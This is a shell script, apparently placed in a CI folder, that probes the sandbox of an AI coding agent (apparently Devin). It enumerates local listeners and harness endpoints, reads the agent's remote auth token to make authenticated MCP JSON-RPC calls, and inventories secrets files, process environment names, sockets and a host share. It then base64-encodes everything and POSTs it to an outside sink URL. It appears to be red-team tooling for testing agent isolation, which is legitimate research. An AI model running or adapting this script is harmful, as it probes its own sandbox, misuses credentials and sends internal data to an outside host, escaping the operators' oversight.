#!/bin/sh
# i78114 — sandbox runtime local-service surface probe (READ-ONLY, single exfil POST)
# Usage: sh ci/probe.sh <sink-url-base>
U="$1"
NONCE="i78114-r1-8f2a1c"
W=/tmp/i78114; mkdir -p "$W"; R="$W/raw.txt"; : >"$R"
export LC_ALL=C
if [ -f "$W/.done" ]; then echo "RUNTIME-PROBE-$NONCE-already"; exit 0; fi
post(){ f="$1"; tag="$2"; code=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 30 --data-binary @"$f" "$U/$tag" 2>/dev/null); echo "POST $tag CODE=$code BYTES=$(wc -c <"$f")" >>"$R"; }
hdr(){ printf '\n===== %s =====\n' "$*" >>"$R"; }

printf 'canary host=%s uid=%s date=%s\n' "$(hostname)" "$(id -u)" "$(date -u +%FT%TZ)" > "$W/c.txt"
post "$W/c.txt" canary

hdr BASIC
{ uname -a; id; cat /etc/hosts; ip -4 -o addr show 2>/dev/null | awk '{print $2,$4}'; } >>"$R" 2>&1

hdr LISTEN_SS
ss -ltnp 2>/dev/null >>"$R" 2>&1

hdr LISTEN_PROC
PORTS=""
for f in /proc/net/tcp /proc/net/tcp6; do
  echo "## $f" >>"$R"
  if [ -r "$f" ]; then
    awk 'NR>1 && $4=="0A" { split($2,a,":"); print a[2] }' "$f" | sort -u >>"$R"
    P=$(awk 'NR>1 && $4=="0A" { split($2,a,":"); print a[2] }' "$f" 2>/dev/null)
    PORTS="$PORTS $P"
  else
    echo "NOROC" >>"$R"
  fi
done
NPORTS=$(for h in $PORTS; do printf '%d\n' "0x$h"; done | sort -un)
echo "DECODED_PORTS=$(echo $NPORTS)" >>"$R"

probe(){ # url tag
  u="$1"; t="$2"
  hdr "CURL $t $u"
  code=$(curl -sS -o "$W/b" -D "$W/h" -m 2 -w '%{http_code} t=%{time_total} s=%{size_download}' "$u" 2>"$W/e")
  echo "code=$code err=$(head -c 120 "$W/e" | tr '\n' ' ')" >>"$R"
  echo "-- headers" >>"$R"; head -c 1000 "$W/h" | tr -d '\000' >>"$R"
  echo "-- body" >>"$R"; head -c 1500 "$W/b" | tr -d '\000' >>"$R"; echo >>"$R"
}

# 1) root path of every discovered listener + fixed candidates
ALL=$(printf '%s\n' $NPORTS 6080 6789 9876 7000 8080 8000 3000 5000 8888 11434 | sort -un)
hdr PORT_ROOT_ALL "ports=$(echo $ALL)"
for p in $ALL; do probe "http://127.0.0.1:$p/" "r$p"; done

# 2) known non-loopback harness face
for pth in "/" "/health" "/proxy/" "/proxy/github.com/fw-ai/cookbook.git/info/refs?service=git-upload-pack"; do
  t=$(echo "gm$pth" | tr -c 'A-Za-z0-9' '_')
  probe "http://git-manager.local:7000$pth" "$t"
done

# 3) candidate API paths on devin-remote ports
for p in 6080 6789 9876; do
  for pth in "/health" "/v1/models" "/mcp" "/json/version"; do
    t=$(echo "p${p}$pth" | tr -c 'A-Za-z0-9' '_')
    probe "http://127.0.0.1:$p$pth" "$t"
  done
done

# 4) MCP-style JSON-RPC on 9876 (token used in-sandbox only; NEVER printed/exfiltrated)
T1=$(tr -d '\r\n' </opt/.devin/devin_remote_auth_token 2>/dev/null)
hdr TOKEN_META
echo "devin_remote_auth_token present=$([ -n "$T1" ] && echo yes || echo no) len=${#T1}" >>"$R"
SID=""
rpc(){ # tag body [noauth]
  tag="$1"; body="$2"; auth="$3"; f="$W/rpc_$tag.bin"; H="$W/rpc_$tag.hdr"; K="$W/hdr.cfg"
  : > "$K"; chmod 600 "$K" 2>/dev/null
  if [ "$auth" != "no" ] && [ -n "$T1" ]; then printf 'header = "Authorization: Bearer %s"\n' "$T1" >> "$K"; fi
  if [ -n "$SID" ]; then printf 'header = "mcp-session-id: %s"\n' "$SID" >> "$K"; fi
  printf 'header = "Content-Type: application/json"\nheader = "Accept: application/json, text/event-stream"\n' >> "$K"
  code=$(curl -sS -o "$f" -D "$H" -K "$K" -m 5 -w '%{http_code}' -X POST --data-binary "$body" http://127.0.0.1:9876/ 2>"$W/rpc_$tag.err")
  echo "RPC $tag code=$code len=$(wc -c <"$f" 2>/dev/null) err=$(head -c 100 "$W/rpc_$tag.err" | tr '\n' ' ')" >>"$R"
  grep -i 'mcp-session-id\|content-type' "$H" 2>/dev/null | tr -d '\r' >>"$R"
  head -c 1200 "$f" 2>/dev/null | tr -d '\000' >>"$R"; echo >>"$R"
}
hdr RPC_PROBES
rpc init_noauth '{"jsonrpc":"2.0","id":0,"method":"initialize","params":{"protocolVersion":"2024-11-05","capabilities":{},"clientInfo":{"name":"i78114","version":"1"}}}' no
rpc init '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2024-11-05","capabilities":{},"clientInfo":{"name":"i78114","version":"1"}}}'
SID=$(grep -i '^mcp-session-id:' "$W/rpc_init.hdr" 2>/dev/null | tr -d '\r' | awk '{print $2}' | head -1)
echo "SID_PRESENT=$([ -n "$SID" ] && echo yes || echo no)" >>"$R"
rpc tools '{"jsonrpc":"2.0","id":2,"method":"tools/list"}'
rpc res '{"jsonrpc":"2.0","id":3,"method":"resources/list"}'
rpc prompts '{"jsonrpc":"2.0","id":4,"method":"prompts/list"}'
rpc ping '{"jsonrpc":"2.0","id":5,"method":"ping"}'

# 5) local inventory of harness runtime files (names/sizes only, no secret values)
hdr OPT_DEVIN_LIST
ls -la /opt/.devin 2>&1 | head -40 >>"$R"
ls -la /opt/.devin/.devin_secrets.sh /opt/.devin/envrc /opt/.devin/package 2>&1 | head -10 >>"$R"
hdr ENV_VAR_NAMES
for pid in $(pgrep -f 'devin-remote' 2>/dev/null | head -3); do
  echo "## pid $pid cmd=$(tr '\0' ' ' </proc/$pid/cmdline 2>/dev/null | head -c 160)" >>"$R"
  tr '\0' '\n' </proc/$pid/environ 2>/dev/null | cut -d= -f1 | sort -u | tr '\n' ' ' >>"$R"; echo >>"$R"
done
hdr UNIX_SOCKETS
awk 'NR>1 {print $2, $8}' /proc/net/unix 2>/dev/null | sort -u | head -60 >>"$R"
hdr HOST_SHARE
ls -la /mnt/host_share 2>&1 | head -30 >>"$R"

hdr DONE
echo "PAYLOAD_OK date=$(date -u +%FT%TZ) bytes=$(wc -c <"$R")" >>"$R"
base64 -w0 "$R" > "$W/p.b64"
post "$W/p.b64" "probe-$NONCE"
touch "$W/.done" 2>/dev/null
echo "RUNTIME-PROBE-$NONCE"
exit 0
